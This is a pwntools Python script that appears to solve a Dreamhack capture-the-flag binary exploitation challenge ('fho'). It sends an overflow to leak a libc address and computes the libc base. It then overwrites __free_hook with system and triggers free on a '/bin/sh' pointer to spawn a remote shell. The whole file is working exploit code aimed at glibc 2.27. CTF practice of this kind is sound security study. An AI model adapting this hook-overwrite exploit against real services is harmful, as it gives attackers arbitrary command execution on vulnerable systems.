#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 9053)

    return r


def main():
    r = conn()

    payload = b"A" * 0x48
    r.sendafter(b"Buf: ", payload)
    
    r.recvuntil(payload)

    leak = r.recvuntil(b"\n", drop=True)

    if len(leak) < 6:
        log.error(f"Bad luck: Null byte in leak (Len: {len(leak)}). Try again.")

    libc_start_main = u64(leak.ljust(8, b"\x00")) - 231
    libc_base = libc_start_main - libc.symbols["__libc_start_main"]
   
    log.success(f"libc_base: {hex(libc_base)}")

    system = libc_base + libc.symbols["system"]
    __free_hook = libc_base + libc.symbols["__free_hook"]
    bin_sh = libc_base + list(libc.search(b"/bin/sh"))[0]

    r.sendlineafter(b"To write: ", str(__free_hook).encode())
    r.sendlineafter(b"With: ", str(system).encode())
    r.sendlineafter(b"To free: ", str(bin_sh).encode())

    r.interactive()


if __name__ == "__main__":
    main()
